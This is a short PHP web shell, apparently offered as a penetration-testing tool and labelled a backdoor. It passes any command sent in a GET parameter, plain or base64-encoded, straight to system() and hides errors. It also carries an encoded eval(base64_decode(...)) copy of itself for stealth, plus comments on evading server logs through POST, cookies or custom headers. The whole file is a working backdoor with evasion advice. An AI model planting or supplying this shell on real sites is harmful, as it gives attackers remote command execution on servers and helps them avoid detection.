<?php

// For ethical and legal purposes only. This script is provided as is and without warranty.
//
// Version: 2.75

if (isset($_GET['c']) && !empty($_GET['c'])) {
  echo "<pre>";
  echo @system($_GET['c']); // Don't output errors.
  echo "</pre>";
}

if (isset($_GET['c64']) && !empty($_GET['c64'])) {
  echo "<pre>";
  echo @system(base64_decode($_GET['c64'])); // Allow Base64 input
  echo "</pre>";
}

// If you want to be more stealthy, then you can use only the line below.
// Samples seen in the wild typically use a mix of base64, gzip, odd variables and multiple rounds of encoding.
// eval(base64_decode("aWYgKGlzc2V0KCRfR0VUWydjJ10pICYmICFlbXB0eSgkX0dFVFsnYyddKSkgew0KICBlY2hvICI8cHJlPiI7DQogIGVjaG8gQHN5c3RlbSgkX0dFVFsnYyddKTsgLy8gRG9uJ3Qgb3V0cHV0IGVycm9ycy4NCiAgZWNobyAiPC9wcmU+IjsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydjNjQnXSkgJiYgIWVtcHR5KCRfR0VUWydjNjQnXSkpIHsNCiAgZWNobyAiPHByZT4iOw0KICBlY2hvIEBzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX0dFVFsnYzY0J10pKTsgLy8gQWxsb3cgQmFzZTY0IGlucHV0DQogIGVjaG8gIjwvcHJlPiI7DQp9"));

// If you use this during a penetration test, you may want to consider adding some sort of authentication.
// This can be achieved by adding another check, such as: if ($_GET['auth']=="md5-hash-here") { @system() code here }
// Obviously, GET-requests have a length limit, and are also logged by default with pretty much any web server.
// To circumvent this, you could use POST-requests, which some web servers log. You can also use cookies, or a
// custom HTTP header. Future versions of this tool may include functionality to automatically modify this backdoor.
?>
